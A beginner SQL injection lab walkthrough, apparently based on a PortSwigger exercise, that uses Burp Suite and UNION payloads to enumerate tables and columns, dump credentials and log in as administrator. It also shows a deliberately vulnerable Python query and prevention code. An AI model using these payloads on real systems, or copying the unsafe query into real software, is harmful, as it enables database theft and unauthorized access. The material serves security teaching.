# SQL Injection Lab - Non Oracle Based Database

## Lab Overview

**Objective**: Exploit a SQL injection vulnerability in a product category filter to extract administrator credentials and gain unauthorized access.

**Difficulty**: Beginner  
**Time Required**: 15-30 minutes  
**Tools Needed**: Burp Suite (Community or Pro Edition)

---

## Lab Scenario

You are testing an e-commerce website that allows users to filter products by category. The application uses the following URL structure:

```
https://target-website.com/filter?category=Gifts
```

Your mission is to exploit a SQL injection vulnerability in the `category` parameter to:
1. Map the database structure
2. Find the users table
3. Extract administrator credentials
4. Successfully login as administrator

---

## Prerequisites

### Setup Burp Suite
1. Open Burp Suite
2. Configure your browser to use Burp proxy (127.0.0.1:8080)
3. Navigate to the Proxy tab
4. Ensure "Intercept is on"

### Navigate to Target
1. Browse to the target website
2. Click on any product category (e.g., "Gifts", "Accessories")
3. Burp Suite will intercept the request

---

## Step-by-Step Exploitation

### Step 1: Intercept the Category Filter Request

**Action**: Use Burp Suite to capture the HTTP request

**Instructions**:
1. Click on a product category
2. In Burp Suite → Proxy → Intercept tab, you should see the request
3. Look for the `category` parameter in the request

**Example captured request**:
```http
GET /filter?category=Gifts HTTP/1.1
Host: target-website.com
User-Agent: Mozilla/5.0
```

**What to do**:
- Right-click the request
- Select "Send to Repeater" (Ctrl+R)
- Go to the Repeater tab for easier testing

---

### Step 2: Determine Number of Columns

**Objective**: Find how many columns the SQL query returns

**Test Payload**:
```sql
'+UNION+SELECT+'abc','def'--
```

**Where to inject**: Replace the `category` parameter value

**Modified request in Repeater**:
```http
GET /filter?category='+UNION+SELECT+'abc','def'-- HTTP/1.1
Host: target-website.com
```

**Instructions**:
1. Paste the payload in the `category` parameter
2. Click "Send" in Burp Repeater
3. Examine the response

**Expected Results**:

✅ **If successful** (2 columns):
- Response code: 200 OK
- Page loads normally
- You might see 'abc' or 'def' displayed on the page

❌ **If error occurs**:
- Try different column counts:
  ```sql
  '+UNION+SELECT+'abc'--           (1 column)
  '+UNION+SELECT+'abc','def','ghi'--  (3 columns)
  ```

**Lab Answer**: The query returns **2 columns**, both containing text data

**Why this works**:
```sql
-- Original query (estimated):
SELECT product_name, description FROM products WHERE category = 'Gifts'

-- Your injection:
SELECT product_name, description FROM products WHERE category = '' 
UNION SELECT 'abc', 'def'--'
```

---

### Step 3: Retrieve List of Tables

**Objective**: Enumerate all tables in the database

**Payload**:
```sql
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

**Modified request**:
```http
GET /filter?category='+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- HTTP/1.1
Host: target-website.com
```

**Instructions**:
1. Replace the `category` parameter with the payload above
2. Click "Send" in Burp Repeater
3. Examine the response body

**What to look for in response**:
```html
<div class="product">
    <h3>products</h3>
</div>
<div class="product">
    <h3>users_abcdef</h3>
</div>
<div class="product">
    <h3>orders</h3>
</div>
<div class="product">
    <h3>sessions</h3>
</div>
```

**Your Task**: 
- Scroll through the response
- Find table names that suggest user data
- Look for patterns like: `users`, `admin`, `accounts`, `credentials`
- Note: The table name may have a random suffix like `users_abcdef`

**Screenshot your findings**: Document the exact table name

---

### Step 4: Identify the User Credentials Table

**From Step 3 response, locate the table name**

**Common patterns**:
- `users`
- `user_accounts`
- `admin`
- `members`
- `users_[random]` (e.g., `users_abcdef`)

**Example**: Let's say you found `users_kp8t2e`

**Write down the exact table name**: 
```
Table name: users_kp8t2e
```

**Important**: The table name is case-sensitive in some databases. Copy it exactly as shown.

---

### Step 5: Retrieve Column Names from Users Table

**Objective**: Find what columns exist in the users table

**Payload Template**:
```sql
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='TABLE_NAME_HERE'--
```

**Replace `TABLE_NAME_HERE` with your actual table name**

**Example if your table is `users_kp8t2e`**:
```sql
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_kp8t2e'--
```

**Modified request**:
```http
GET /filter?category='+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_kp8t2e'-- HTTP/1.1
Host: target-website.com
```

**Instructions**:
1. Update the payload with YOUR table name
2. Send the request in Burp Repeater
3. Examine the response

**What you'll see in response**:
```html
<div class="product">
    <h3>id</h3>
</div>
<div class="product">
    <h3>username_kp8t2e</h3>
</div>
<div class="product">
    <h3>password_kp8t2e</h3>
</div>
<div class="product">
    <h3>email</h3>
</div>
```

**Your Task**:
- Identify the column containing usernames
- Identify the column containing passwords
- Note: Column names may also have random suffixes

**Document your findings**:
```
Username column: username_kp8t2e
Password column: password_kp8t2e
```

---

### Step 6: Find Username and Password Column Names

**From Step 5 response, identify**:

✅ **Username column**: Look for names like:
- `username`
- `user`
- `login`
- `username_[random]`

✅ **Password column**: Look for names like:
- `password`
- `pass`
- `pwd`
- `password_[random]`

**Example extraction from response**:
```
Columns found:
- id
- username_kp8t2e  ← This is the username column
- password_kp8t2e  ← This is the password column
- email
- created_at
```

---

### Step 7: Extract All Usernames and Passwords

**Objective**: Dump all user credentials from the database

**Payload Template**:
```sql
'+UNION+SELECT+USERNAME_COLUMN,+PASSWORD_COLUMN+FROM+TABLE_NAME--
```

**Replace placeholders**:
- `USERNAME_COLUMN` → Your username column name
- `PASSWORD_COLUMN` → Your password column name
- `TABLE_NAME` → Your users table name

**Example with actual names**:
```sql
'+UNION+SELECT+username_kp8t2e,+password_kp8t2e+FROM+users_kp8t2e--
```

**Modified request**:
```http
GET /filter?category='+UNION+SELECT+username_kp8t2e,+password_kp8t2e+FROM+users_kp8t2e-- HTTP/1.1
Host: target-website.com
```

**Instructions**:
1. Update the payload with YOUR column and table names
2. Send the request in Burp Repeater
3. Examine the response

**What you'll see in response**:
```html
<div class="product">
    <h3>administrator</h3>
    <p>5z8k3m9q1w7r2t4y</p>
</div>
<div class="product">
    <h3>carlos</h3>
    <p>abcd1234efgh5678</p>
</div>
<div class="product">
    <h3>wiener</h3>
    <p>password123</p>
</div>
```

**Your Task**:
- Locate the `administrator` username
- Copy the corresponding password
- Note: Passwords might be plaintext or hashed

**Document the administrator password**:
```
Username: administrator
Password: 5z8k3m9q1w7r2t4y
```

---

### Step 8: Login as Administrator

**Objective**: Use the stolen credentials to gain unauthorized access

**Instructions**:
1. **Disable Burp Intercept** (or turn off proxy)
2. Navigate to the website's login page
3. Enter the credentials:
   - **Username**: `administrator`
   - **Password**: `[password you found]`
4. Click "Login" or "Sign In"

**Expected Result**:
✅ Successfully logged in as administrator  
✅ Access to admin panel or privileged features  
✅ Lab marked as solved

**If login fails**:
- Double-check you copied the password correctly
- Ensure there are no extra spaces
- Try copying the password directly from the HTTP response

---

## Lab Solution Summary

**Complete Exploitation Chain**:

```
1. Intercept request → Burp Suite Proxy
   ↓
2. Test column count → '+UNION+SELECT+'abc','def'--
   ↓
3. Enumerate tables → information_schema.tables
   ↓
4. Find users table → users_kp8t2e (example)
   ↓
5. Enumerate columns → information_schema.columns
   ↓
6. Identify credential columns → username_kp8t2e, password_kp8t2e
   ↓
7. Extract credentials → SELECT username, password FROM users
   ↓
8. Login as administrator → Lab complete! ✓
```

---

## Key Payloads Used

### Payload 1: Column Count Detection
```sql
'+UNION+SELECT+'abc','def'--
```
**Purpose**: Verify the query returns 2 columns with text data

---

### Payload 2: Table Enumeration
```sql
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```
**Purpose**: List all tables in the database

---

### Payload 3: Column Enumeration
```sql
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_kp8t2e'--
```
**Purpose**: List all columns in the users table  
**Note**: Replace `users_kp8t2e` with your actual table name

---

### Payload 4: Data Extraction
```sql
'+UNION+SELECT+username_kp8t2e,+password_kp8t2e+FROM+users_kp8t2e--
```
**Purpose**: Extract all usernames and passwords  
**Note**: Replace column and table names with your actual names

---

## Understanding the Exploitation

### Why This Works

**Vulnerable Code (Backend)**:
```python
# Unsafe - Vulnerable to SQL Injection
category = request.GET['category']
query = f"SELECT name, description FROM products WHERE category = '{category}'"
cursor.execute(query)
```

**Exploitation Breakdown**:

**Original query**:
```sql
SELECT name, description FROM products WHERE category = 'Gifts'
```

**After injection with** `' UNION SELECT 'abc','def'--`:
```sql
SELECT name, description FROM products WHERE category = '' 
UNION SELECT 'abc','def'--'
```

**Explanation**:
1. `'` closes the original string
2. Empty string returns no products
3. `UNION SELECT 'abc','def'` adds our data
4. `--` comments out the rest (the trailing `'`)

---

### Why Use NULL?

**In Payload 2 & 3, we use NULL in the second column**:
```sql
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

**Reason**:
- UNION requires **same number of columns**
- We only need data from 1 column (`table_name`)
- `NULL` acts as a placeholder for the 2nd column
- Could also use: `'x'`, `1`, `'dummy'`

**Example**:
```sql
-- Both are valid:
UNION SELECT table_name, NULL
UNION SELECT table_name, 'filler'
UNION SELECT table_name, 1
```

---

### What is information_schema?

**Definition**: A meta-database that contains information about all databases

**Key tables**:
- `information_schema.tables` → All table names
- `information_schema.columns` → All column names
- `information_schema.schemata` → All database names

**Why attackers love it**:
- No need to guess table names
- No need to guess column names
- Complete database structure revealed
- Works on: MySQL, PostgreSQL, SQL Server

---

## Troubleshooting

### Problem: "Internal Server Error" (500)
**Cause**: SQL syntax error in your payload  
**Solution**:
- Check your single quotes (`'`)
- Ensure `--` comment at the end
- Verify column count is correct

---

### Problem: No data appears on page
**Cause**: Data is in a hidden column  
**Solution**:
- Swap column positions:
  ```sql
  -- Try both:
  '+UNION+SELECT+table_name,+NULL--
  '+UNION+SELECT+NULL,+table_name--
  ```

---

### Problem: "Column count doesn't match"
**Cause**: Wrong number of columns in UNION SELECT  
**Solution**:
- Add or remove columns:
  ```sql
  '+UNION+SELECT+'a'--           (1 column)
  '+UNION+SELECT+'a','b'--       (2 columns)
  '+UNION+SELECT+'a','b','c'--   (3 columns)
  ```

---

### Problem: Table name not found
**Cause**: Typo in table name or wrong database  
**Solution**:
- Copy table name exactly as shown
- Check for random suffixes
- Ensure quotes around table name:
  ```sql
  -- Wrong:
  WHERE table_name=users_kp8t2e
  
  -- Correct:
  WHERE table_name='users_kp8t2e'
  ```

---

### Problem: Can't find administrator password
**Cause**: Response shows too many results  
**Solution**: Look carefully through the response, or limit results:
```sql
-- Add LIMIT to see one at a time:
'+UNION+SELECT+username_kp8t2e,+password_kp8t2e+FROM+users_kp8t2e+LIMIT+0,1--
'+UNION+SELECT+username_kp8t2e,+password_kp8t2e+FROM+users_kp8t2e+LIMIT+1,1--
```

---

## Burp Suite Tips

### Using Repeater Effectively

1. **Send to Repeater**: Right-click request → "Send to Repeater" (Ctrl+R)

2. **Edit requests easily**: Modify the `category` parameter value

3. **Compare responses**: Right-click response → "Show response in browser"

4. **Save successful payloads**: Right-click request → "Copy to file"

---

### URL Encoding in Burp

**Automatic encoding**:
- Highlight text in Repeater
- Right-click → "Convert selection" → "URL" → "URL-encode key characters"

**Manual encoding**:
- Space → `+` or `%20`
- `'` → `%27`
- `--` → `%2D%2D`

**Tip**: Burp Repeater automatically handles most encoding

---

### Using Burp Logger

1. Go to Proxy → HTTP history
2. Filter by "Show only: Parameterized requests"
3. See all requests to `/filter?category=`
4. Easy to compare different payloads

---

## Lab Completion Checklist

- [ ] Burp Suite configured and intercepting traffic
- [ ] Request sent to Repeater
- [ ] Column count identified (2 columns)
- [ ] Table list retrieved
- [ ] Users table name found: `users_______`
- [ ] Column names identified: `username_______`, `password_______`
- [ ] All credentials extracted
- [ ] Administrator password copied: `________________`
- [ ] Successfully logged in as administrator
- [ ] Lab marked as complete ✓

---

## What You Learned

### Technical Skills
✅ Using Burp Suite Proxy and Repeater  
✅ Detecting SQL injection vulnerabilities  
✅ UNION-based SQL injection  
✅ Enumerating database structure  
✅ Extracting sensitive data  
✅ Bypassing authentication

### Attack Methodology
✅ Reconnaissance (column count)  
✅ Enumeration (tables and columns)  
✅ Exploitation (data extraction)  
✅ Post-exploitation (unauthorized access)

### Tools Mastered
✅ Burp Suite interception  
✅ Burp Repeater for testing  
✅ URL encoding  
✅ SQL UNION queries

---

## Next Steps

### Practice More Labs
1. **Time-based blind SQL injection**
2. **Boolean-based blind SQL injection**
3. **SQL injection with WHERE clause**
4. **SQL injection in UPDATE statements**

### Advanced Techniques
- Bypassing WAF (Web Application Firewall)
- Second-order SQL injection
- Out-of-band SQL injection
- Automated exploitation with SQLmap

### Study Further
- Read: OWASP SQL Injection Guide
- Practice: PortSwigger SQL Injection Labs
- CTF: TryHackMe SQL Injection rooms

---

## Prevention (For Developers)

**How to prevent this vulnerability**:

### Use Parameterized Queries
```python
# Safe - Uses parameterized query
category = request.GET['category']
query = "SELECT name, description FROM products WHERE category = ?"
cursor.execute(query, (category,))
```

### Use ORM Frameworks
```python
# Safe - Uses ORM
products = Product.objects.filter(category=category)
```

### Input Validation
```python
# Whitelist allowed categories
ALLOWED_CATEGORIES = ['Gifts', 'Electronics', 'Clothing']
if category not in ALLOWED_CATEGORIES:
    return "Invalid category"
```

---

## Additional Resources

### Learning Platforms
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection)
- [TryHackMe SQL Injection](https://tryhackme.com/room/sqlinjectionlm)
- [HackTheBox Academy](https://academy.hackthebox.com/)

### Documentation
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [MySQL UNION Documentation](https://dev.mysql.com/doc/refman/8.0/en/union.html)
- [information_schema Reference](https://dev.mysql.com/doc/refman/8.0/en/information-schema.html)

### Tools
- [Burp Suite](https://portswigger.net/burp)
- [SQLmap](http://sqlmap.org/) (automated tool)
- [OWASP ZAP](https://www.zaproxy.org/)

---

## Lab Report Template

```
SQL Injection Lab Report
Date: [DATE]
Target: [URL]

Vulnerability Found: SQL Injection in category parameter
Severity: Critical
CVSS Score: 9.8

Exploitation Steps:
1. Intercepted request to /filter?category=
2. Confirmed 2-column UNION injection
3. Enumerated tables: [TABLE NAMES]
4. Found users table: [TABLE NAME]
5. Extracted columns: [COLUMN NAMES]
6. Retrieved credentials: [NUMBER] users compromised
7. Gained admin access: administrator:[PASSWORD]

Impact:
- Complete database compromise
- Unauthorized admin access
- Potential data breach of [X] user accounts

Remediation:
- Implement parameterized queries
- Add input validation
- Remove information_schema access
- Implement WAF rules
```

---

**Congratulations on completing the lab!** 🎉

You've successfully exploited a SQL injection vulnerability and gained unauthorized access. Remember to use these skills ethically and only on systems you have permission to test.